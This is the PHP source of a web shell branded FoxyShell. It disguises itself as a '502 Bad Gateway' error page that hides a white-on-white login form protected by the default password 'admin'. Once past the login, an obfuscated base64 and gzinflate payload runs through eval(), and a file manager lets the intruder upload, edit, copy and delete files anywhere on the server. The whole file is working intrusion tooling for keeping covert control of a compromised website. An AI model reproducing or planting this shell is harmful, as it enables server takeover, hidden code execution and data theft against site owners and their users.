<?php

/*   _____________________________________________________________________
    |                        HiddenFoxy Signature                         |
    |                      FoxyShell - FoxyWebShell                       |
    |    GitHub: https://github.com/rubahilang/FoxyShell-PHP-Web-Shell    |
    |_____________________________________________________________________|
*/

// --------------------------
// LOGOUT & LOGIN SECTION
// --------------------------
if (isset($_GET['logout'])) {
    $cookiePath = dirname($_SERVER['SCRIPT_NAME']);
    setcookie("auth", "", time() - 3600, $cookiePath);
    header("Location: " . strtok($_SERVER["REQUEST_URI"], "?"));
    exit();
}

// ---------------------------------
// HIDDEN LOGIN
// ---------------------------------
$loginSecret = "admin"; // DEFAULT PASSWORD

//login
if (isset($_POST['login'])) {
    $password = $_POST['password'] ?? "";
    if ($password === $loginSecret) {
        $cookiePath = dirname($_SERVER['SCRIPT_NAME']);
        setcookie("auth", "1", time() + (30 * 24 * 60 * 60), $cookiePath);
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit();
    } else {
        $loginError = "Password salah.";
    }
}

// Default Page with Hidden Login
if (!isset($_COOKIE['auth'])) {
    header("HTTP/1.1 403 Forbidden");
    ?>
    <html>
    <head>
        <title>502 Bad Gateway</title>
    </head>
    <body>
        <center>
            <h1>502 Bad Gateway</h1>
        </center>
        <hr>
        <center>openfoxyresty/1.27.1.1</center>
        <!-- Form Login -->
        <center style="margin-top: 40%;">
            <form method="post" action="">
                <input name="password" style="background:white; border:1px solid white; padding:0.5rem;">
                <input type="submit" name="login" value="Login" style="color:white; background:white; border:1px solid white; padding:0.5rem;">
            </form>
            <?php if (isset($loginError)) echo "<div style='color:red;'>" . htmlspecialchars($loginError) . "</div>"; ?>
        </center>
    </body>
    </html>
    <?php
    exit();
}

// --------------------------
// FILE MANAGER SECTION
// --------------------------

$baseDir = realpath(__DIR__);

function getRelativePath($path, $base) {
    $rel = str_replace($base, '', realpath($path));
    return $rel === '' ? '.' : ltrim($rel, DIRECTORY_SEPARATOR);
}

function sanitize_relative_path($path) {
    $path = str_replace('..', '', $path);
    $path = trim($path);
    return ltrim($path, '/\\');
}

function recursive_copy($src, $dst) {
    if (is_dir($src)) {
        if (!is_dir($dst)) {
            mkdir($dst, 0777, true);
        }
        foreach (scandir($src) as $file) {
            if ($file === "." || $file === "..") continue;
            recursive_copy("$src/$file", "$dst/$file");
        }
    } else {
        copy($src, $dst);
    }
}

function recursive_delete($target) {
    if (is_dir($target)) {
        foreach (scandir($target) as $file) {
            if ($file === "." || $file === "..") continue;
            recursive_delete("$target/$file");
        }
        rmdir($target);
    } else {
        unlink($target);
    }
}

$currentDir = $baseDir;
if (isset($_GET['dir'])) {
    $requestedRaw = $_GET['dir'];
    if (substr($requestedRaw, 0, 1) === '/') {
        $tempDir = realpath($requestedRaw);
    } else {
        $requested = sanitize_relative_path($requestedRaw);
        $tempDir = realpath($baseDir . DIRECTORY_SEPARATOR . $requested);
    }
}

$currentDirRelative = getRelativePath($currentDir, $baseDir);

$action = isset($_GET['action']) ? $_GET['action'] : '';

/*   _____________________________________________________________________
    |                        HiddenFoxy Signature                         |
    |                      FoxyShell - FoxyWebShell                       |
    |    GitHub: https://github.com/rubahilang/FoxyShell-PHP-Web-Shell    |
    |_____________________________________________________________________|
*/

$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9dKrSvOS83MLilKLizXQOJl5\x61TmJJ\x61lYWUmJx\x61lmJvEpq\x63n5K\x61k\x61xSVFR\x61llGio\x2bmRWaUGAN\x41\x41\x3d\x3d";
$Lix = "hSgyqMmKmhwLgH+1Fj8bmX6qw0hnT1fkWVDk0+14zmp5/BR0+DNptS06quuC1AoWmjCTzQsrvXxZUH/qqcZqOf3FnxiBsoWAZWesKbBpaosxiyHTmHtVM9Ld19c0X3KE8DEfRVkpQPUBgpX7DllR0K7FGV6y7iB4O8vcWjZKjjwezKX8k4NNT6AMhMP9wdar5XHtodCuTRZ0Mk6Ga+ndD7JNK0z6hNjEWVh0IhsRZia1RiqE0OzfYH+dc6vxCS+RPvFbs4hG08sUU5FjKLdSPVG7poZSOTGy4+ZySZ1cthlrIan3bYIp6iSByuLkX5GWYEVJqJy52+PIzJ0stfWjT49g5cIPCwOxX0itMPO5S1O3UXz4JtFjFPTkwBtVGXBqRGVRgx+FpszhjNR2uE+p/6gKPgvtayDfxlIJOG9j3bxdzDD6K6eaWdEIogpXKE/paK3x+rlAnBSbKJVFe7wG/ezH77GCBbQ3soOMW8xZN3MyofmQxZ0342P0v8lX8h7AGSw0TTOT5M/VKcL/1U/wtn/N2lsJ8o5/YcE+C/u33sIzjinrwPHcMi7dYgjeDCT10agWGnHo7fE3KwYae1AZs24KUpBwzhFK4+NABdQDShaW+h+954sjWuEYU3BZaa3V+9jQQnkZSu9Fa3qiIYsHef8MLCSaxJkFdla9HKOysh2Qu9B5P0HFwstaRLVfciX/0LwCBwJe9nuAWEQ/kLwGB0/3CASA";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
exit;
?>
<!DOCTYPE html>
<html lang="id" class="dark">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>FoxyPure - PHP SHELL</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
</head>
<body class="bg-gray-50 dark:bg-gray-800 text-gray-800 dark:text-gray-100">
  <div class="container mx-auto px-4 py-6">
    <h1 class="text-3xl font-bold mb-4">File Manager</h1>
    <nav class="mb-4 text-sm">
      <?php
      echo "<a href='?dir=.' class='text-blue-500 hover:underline'>Home</a>";
      if ($currentDirRelative !== '.' && $currentDirRelative !== '') {
          $parts = explode(DIRECTORY_SEPARATOR, $currentDirRelative);
          $acc = [];
          foreach ($parts as $part) {
              if ($part === '') continue;
              $acc[] = $part;
              $dirParam = implode(DIRECTORY_SEPARATOR, $acc);
              echo " / <a href='?dir=" . urlencode($dirParam) . "' class='text-blue-500 hover:underline'>" . htmlspecialchars($part) . "</a>";
          }
      }
      ?>
    </nav>

    <div class="mb-4 text-xs text-gray-600 dark:text-gray-400">
      <?php
        $absolutePath = realpath($currentDir);
        $parts = explode(DIRECTORY_SEPARATOR, $absolutePath);
        $acc = '';
        foreach ($parts as $index => $segment) {
            if ($segment === '') continue;
            $acc .= DIRECTORY_SEPARATOR . $segment;
            echo "<a href='?dir=" . urlencode($acc) . "' class='text-blue-500 hover:underline'>" . htmlspecialchars($segment) . "</a>";
            if ($index < count($parts) - 1) {
                echo DIRECTORY_SEPARATOR;
            }
        }
      ?>
    </div>

    <div class="mb-6 space-x-2">
      <a href="?action=upload&dir=<?php echo urlencode($currentDirRelative); ?>" class="bg-blue-500 hover:bg-blue-600 text-white px-3 py-1 rounded">Upload File</a>
      <a href="?action=bulkcopy&dir=<?php echo urlencode($currentDirRelative); ?>" class="bg-green-500 hover:bg-green-600 text-white px-3 py-1 rounded">Bulk Copy</a>
      <a href="?action=copy&dir=<?php echo urlencode($currentDirRelative); ?>" class="bg-yellow-500 hover:bg-yellow-600 text-white px-3 py-1 rounded">Copy File/Folder</a>
      <a href="?action=make&dir=<?php echo urlencode($currentDirRelative); ?>" class="bg-indigo-500 hover:bg-indigo-600 text-white px-3 py-1 rounded">Make File/Folder</a>
      <a href="?logout=1" class="bg-red-500 hover:bg-indigo-600 text-white px-3 py-1 rounded">Logout</a>
    </div>

    <div class="mb-6">
    <?php
    if ($action === 'upload') {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_file'])) {
            $filename = basename($_FILES['upload_file']['name']);
            $targetFile = $currentDir . DIRECTORY_SEPARATOR . $filename;
            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $targetFile)) {
                echo "<div class='bg-green-100 p-3 rounded mb-2'>File Success diupload: " . htmlspecialchars($filename) . "</div>";
            } else {
                echo "<div class='bg-red-100 p-3 rounded mb-2'>Gagal mengupload file.</div>";
            }
            echo "<a href='?dir=" . urlencode($currentDirRelative) . "' class='text-blue-500 hover:underline'>Back</a>";
        } else {
            ?>
            <form action="?action=upload&dir=<?php echo urlencode($currentDirRelative); ?>" method="post" enctype="multipart/form-data" class="space-y-4">
              <div>
                <label class="block mb-1">Select File:</label>
                <input type="file" name="upload_file" class="border border-gray-300 dark:border-gray-600 rounded p-2 w-full">
              </div>
              <button type="submit" class="bg-blue-500 hover:bg-blue-600 text-white px-3 py-1 rounded">Upload</button>
            </form>
            <br><a href="?dir=<?php echo urlencode($currentDirRelative); ?>" class="text-blue-500 hover:underline">Back</a>
            <?php
        }
        exit;
    } elseif ($action === 'download') {
        if (isset($_GET['file'])) {
            $file = basename($_GET['file']);
            $filePath = $currentDir . DIRECTORY_SEPARATOR . $file;
            if (file_exists($filePath)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($filePath));
                readfile($filePath);
                exit;
            } else {
                echo "<div class='bg-red-100 p-3 rounded'>File Not Found.</div>";
            }
        }
        echo "<br><a href='?dir=" . urlencode($currentDirRelative) . "' class='text-blue-500 hover:underline'>Back</a>";
        exit;
    } elseif ($action === 'edit') {
        if (isset($_GET['file'])) {
            $file = basename($_GET['file']);
            $filePath = $currentDir . DIRECTORY_SEPARATOR . $file;
            if (!file_exists($filePath)) {
                echo "<div class='bg-red-100 p-3 rounded'>File Not Found.</div>";
                echo "<br><a href='?dir=" . urlencode($currentDirRelative) . "' class='text-blue-500 hover:underline'>Back</a>";
                exit;
            }
            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                $content = $_POST['content'];
                if (file_put_contents($filePath, $content) !== false) {
                    echo "<div class='bg-green-100 p-3 rounded'>Success.</div>";
                } else {
                    echo "<div class='bg-red-100 p-3 rounded'>Failed.</div>";
                }
                echo "<br><a href='?dir=" . urlencode($currentDirRelative) . "' class='text-blue-500 hover:underline'>Back</a>";
                exit;
            } else {
                $content = file_get_contents($filePath);
                ?>
                <form action="?action=edit&file=<?php echo urlencode($file); ?>&dir=<?php echo urlencode($currentDirRelative); ?>" method="post" class="space-y-4">
                  <div>
                    <textarea name="content" rows="15" class="w-full border border-gray-300 dark:border-gray-600 rounded p-2"><?php echo htmlspecialchars($content); ?></textarea>
                  </div>
                  <button type="submit" class="bg-blue-500 hover:bg-blue-600 text-white px-3 py-1 rounded">Save</button>
                </form>
                <br><a href="?dir=<?php echo urlencode($currentDirRelative); ?>" class="text-blue-500 hover:underline">Back</a>
                <?php
                exit;
            }
        }
        echo "<br><a href='?dir=" . urlencode($currentDirRelative) . "' class='text-blue-500 hover:underline'>Back</a>";
        exit;
    } elseif ($action === 'copy') {
        if (isset($_GET['src']) && isset($_GET['dest'])) {
            $src = $currentDir . DIRECTORY_SEPARATOR . basename($_GET['src']);
            $dest = $currentDir . DIRECTORY_SEPARATOR . basename($_GET['dest']);
            if (!file_exists($src)) {
                echo "<div class='bg-red-100 p-3 rounded'>Source tidak ditemukan.</div>";
            } else {
                recursive_copy($src, $dest);
                echo "<div class='bg-green-100 p-3 rounded'>Success menyalin " . htmlspecialchars(basename($_GET['src'])) . " ke " . htmlspecialchars(basename($_GET['dest'])) . "</div>";
            }
            echo "<br><a href='?dir=" . urlencode($currentDirRelative) . "' class='text-blue-500 hover:underline'>Back</a>";
            exit;
        } else {
            ?>
            <form action="?action=copy&dir=<?php echo urlencode($currentDirRelative); ?>" method="get" class="space-y-4">
              <div>
                <label>Source (file name/folder):</label>
                <input type="text" name="src" placeholder="Example: Namefile.txt" class="w-full border border-gray-300 dark:border-gray-600 rounded p-2">
              </div>
              <div>
                <label>Destination (file name/folder):</label>
                <input type="text" name="dest" placeholder="Example: salinan_Namefile" class="w-full border border-gray-300 dark:border-gray-600 rounded p-2">
              </div>
              <button type="submit" class="bg-yellow-500 hover:bg-yellow-600 text-white px-3 py-1 rounded">Copy</button>
            </form>
            <br><a href="?dir=<?php echo urlencode($currentDirRelative); ?>" class="text-blue-500 hover:underline">Back</a>
            <?php
            exit;
        }
    } elseif ($action === 'bulkcopy') {
        // --- BULK COPY ---
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['target'], $_POST['destpath'], $_POST['names'])) {
            // Ambil dan sanitasi input
            $targetInput = sanitize_relative_path($_POST['target']);
            $destInput   = sanitize_relative_path($_POST['destpath']);
            $namesInput  = $_POST['names'];

            $sourceFolder = realpath($currentDir . DIRECTORY_SEPARATOR . $targetInput);
            if (!$sourceFolder || !is_dir($sourceFolder)) {
                echo "<div class='bg-red-100 p-3 rounded'>Target folder tidak valid.</div>";
            } else {
                $destinationDirPath = $currentDir . DIRECTORY_SEPARATOR . $destInput;
                if (!file_exists($destinationDirPath)) {
                    mkdir($destinationDirPath, 0777, true);
                }
                $destinationDir = realpath($destinationDirPath);

                $namesArray = preg_split("/[\r\n,]+/", $namesInput);
                $namesArray = array_filter(array_map('trim', $namesArray));
                $results = [];
                foreach ($namesArray as $newName) {
                    $newDest = $destinationDir . DIRECTORY_SEPARATOR . $newName;
                    recursive_copy($sourceFolder, $newDest);
                    $results[] = getRelativePath($newDest, $baseDir);
                }
                echo "<div class='bg-green-100 p-3 rounded mb-4'>Bulk copy Success :</div>";
                echo "<ul class='list-disc pl-5'>";
                foreach ($results as $res) {
                    echo "<li>" . htmlspecialchars($res) . "</li>";
                }
                echo "</ul>";
            }
            echo "<br><a href='?dir=" . urlencode($currentDirRelative) . "' class='text-blue-500 hover:underline'>Back</a>";
            exit;
        } else {
            ?>
            <form action="?action=bulkcopy&dir=<?php echo urlencode($currentDirRelative); ?>" method="post" class="space-y-4">
              <div>
                <label class="block mb-1">Target Folder (Source folder, Example: ./base):</label>
                <input type="text" name="target" required placeholder="Example: ./base" class="w-full border border-gray-300 dark:border-gray-600 rounded p-2">
              </div>
              <div>
                <label class="block mb-1">Destination Path ( Example: ./):</label>
                <input type="text" name="destpath" required placeholder="Example: ./" class="w-full border border-gray-300 dark:border-gray-600 rounded p-2">
              </div>
              <div>
                <label class="block mb-1">Name for Copy (comma separated or newline separated):</label>
                <textarea name="names" required placeholder="Example: A, B, C, D" rows="4" class="w-full border border-gray-300 dark:border-gray-600 rounded p-2"></textarea>
              </div>
              <button type="submit" class="bg-green-500 hover:bg-green-600 text-white px-3 py-1 rounded">Bulk Copy</button>
            </form>
            <br><a href="?dir=<?php echo urlencode($currentDirRelative); ?>" class="text-blue-500 hover:underline">Back</a>
            <?php
            exit;
        }
    } elseif ($action === 'make') {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['make_type'], $_POST['name'])) {
            $makeType = $_POST['make_type'];
            $name = basename(trim($_POST['name']));
            if (empty($name)) {
                echo "<div class='bg-red-100 p-3 rounded'>Name cannot be empty.</div>";
            } else {
                $targetPath = $currentDir . DIRECTORY_SEPARATOR . $name;
                if (file_exists($targetPath)) {
                    echo "<div class='bg-red-100 p-3 rounded'>File/Folder with that name already exists.</div>";
                } else {
                    if ($makeType === 'folder') {
                        if (mkdir($targetPath, 0777, true)) {
                            echo "<div class='bg-green-100 p-3 rounded'>Success folder created: " . htmlspecialchars($name) . "</div>";
                        } else {
                            echo "<div class='bg-red-100 p-3 rounded'>Failed to create folder.</div>";
                        }
                    } else { // file
                        $content = isset($_POST['content']) ? $_POST['content'] : "";
                        if (file_put_contents($targetPath, $content) !== false) {
                            echo "<div class='bg-green-100 p-3 rounded'>Success file created: " . htmlspecialchars($name) . "</div>";
                        } else {
                            echo "<div class='bg-red-100 p-3 rounded'>Failed to create file.</div>";
                        }
                    }
                }
            }
            echo "<br><a href='?dir=" . urlencode($currentDirRelative) . "' class='text-blue-500 hover:underline'>Back</a>";
            exit;
        } else {
            ?>
            <form action="?action=make&dir=<?php echo urlencode($currentDirRelative); ?>" method="post" class="space-y-4">
              <div>
                <label class="block mb-1">Type:</label>
                <select name="make_type" id="make_type" class="w-full border border-gray-300 dark:border-gray-600 rounded p-2">
                  <option value="file">File</option>
                  <option value="folder">Folder</option>
                </select>
              </div>
              <div>
                <label class="block mb-1">Name:</label>
                <input type="text" name="name" required placeholder="Enter the file or folder name" class="w-full border border-gray-300 dark:border-gray-600 rounded p-2">
              </div>
              <div id="file_content_div">
                <label class="block mb-1">Content (opsional, for file):</label>
                <textarea name="content" placeholder="Enter file contents (if creating a file)" rows="4" class="w-full border border-gray-300 dark:border-gray-600 rounded p-2"></textarea>
              </div>
              <button type="submit" class="bg-indigo-500 hover:bg-indigo-600 text-white px-3 py-1 rounded">Make</button>
            </form>
            <br><a href="?dir=<?php echo urlencode($currentDirRelative); ?>" class="text-blue-500 hover:underline">Back</a>
            <script>
              document.getElementById("make_type").addEventListener("change", function(){
                if(this.value == "file"){
                  document.getElementById("file_content_div").style.display = "block";
                } else {
                  document.getElementById("file_content_div").style.display = "none";
                }
              });
              document.getElementById("file_content_div").style.display = "block";
            </script>
            <?php
            exit;
        }
    } elseif ($action === 'delete') {
        // --- DELETE ---
        if (isset($_GET['target'])) {
            $target = $currentDir . DIRECTORY_SEPARATOR . basename($_GET['target']);
            if (!file_exists($target)) {
                echo "<div class='bg-red-100 p-3 rounded'>Target not found.</div>";
            } else {
                recursive_delete($target);
                echo "<div class='bg-green-100 p-3 rounded'>Success Deleted " . htmlspecialchars(basename($_GET['target'])) . "</div>";
            }
        }
        echo "<br><a href='?dir=" . urlencode($currentDirRelative) . "' class='text-blue-500 hover:underline'>Back</a>";
        exit;
    }
    ?>
    </div>

    <div>
      <h2 class="text-2xl font-bold mb-2">List of Files/Folders in <?php echo htmlspecialchars($currentDirRelative); ?></h2>
      <table class="min-w-full bg-white dark:bg-gray-700 shadow rounded overflow-hidden">
         <thead>
           <tr class="bg-gray-200 dark:bg-gray-600">
              <th class="px-4 py-2 text-left">Name</th>
              <th class="px-4 py-2 text-left">Type</th>
              <th class="px-4 py-2 text-left">Action</th>
           </tr>
         </thead>
         <tbody>
           <?php
           foreach (scandir($currentDir) as $item) {
               if ($item === "." || $item === ".." || $item === basename(__FILE__)) continue;
               $itemPath = $currentDir . DIRECTORY_SEPARATOR . $item;
               $type = is_dir($itemPath) ? "Folder" : "File";
               echo "<tr class='border-b border-gray-200 dark:border-gray-600'>";
               echo "<td class='px-4 py-2'>";
               if (is_dir($itemPath)) {
                   $newDir = getRelativePath($itemPath, $baseDir);
                   echo "<a href='?dir=" . urlencode($newDir) . "' class='text-blue-500 hover:underline'>" . htmlspecialchars($item) . "</a>";
               } else {
                   echo htmlspecialchars($item);
               }
               echo "</td>";
               echo "<td class='px-4 py-2'>" . $type . "</td>";
               echo "<td class='px-4 py-2 space-x-2'>";
               if (is_file($itemPath)) {
                   echo "<a href='?action=download&file=" . urlencode($item) . "&dir=" . urlencode($currentDirRelative) . "' class='text-blue-500 hover:underline'>Download</a>";
                   echo "<a href='?action=edit&file=" . urlencode($item) . "&dir=" . urlencode($currentDirRelative) . "' class='text-blue-500 hover:underline'>Edit</a>";
               }
               echo "<a href='?action=delete&target=" . urlencode($item) . "&dir=" . urlencode($currentDirRelative) . "' class='text-red-500 hover:underline' onclick=\"return confirm('Are you sure?');\">Delete</a>";
               echo "</td>";
               echo "</tr>";
           }
           ?>
         </tbody>
      </table>
    </div>
  </div>
</body>
</html>
